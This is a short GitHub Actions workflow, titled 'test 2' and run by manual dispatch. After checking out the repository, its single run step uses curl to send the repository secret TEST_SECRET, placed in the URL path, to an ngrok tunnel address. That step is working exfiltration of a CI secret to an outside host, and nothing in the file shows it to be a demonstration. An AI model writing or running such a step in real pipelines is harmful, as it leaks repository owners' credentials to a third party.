name: test 2
on:
  workflow_dispatch:

env:
  TEST_SECRET: ${{ secrets.TEST_SECRET }}

jobs:
  test2:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: curl https://67af-240b-11-ba00-4100-c5c0-792a-f266-4908.ngrok-free.app/bbb/$TEST_SECRET
